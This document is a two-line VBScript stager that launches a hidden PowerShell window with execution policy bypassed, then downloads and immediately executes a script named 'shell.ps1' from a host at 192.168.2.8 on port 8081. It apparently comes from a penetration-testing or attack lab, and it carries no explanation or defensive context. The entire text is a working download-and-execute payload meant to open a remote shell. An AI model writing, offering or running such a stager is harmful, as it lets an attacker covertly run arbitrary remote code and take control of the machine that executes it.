Set objShell = CreateObject("Wscript.Shell")
objShell.Run "powershell -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.2.8:8081/shell.ps1')", 0, False
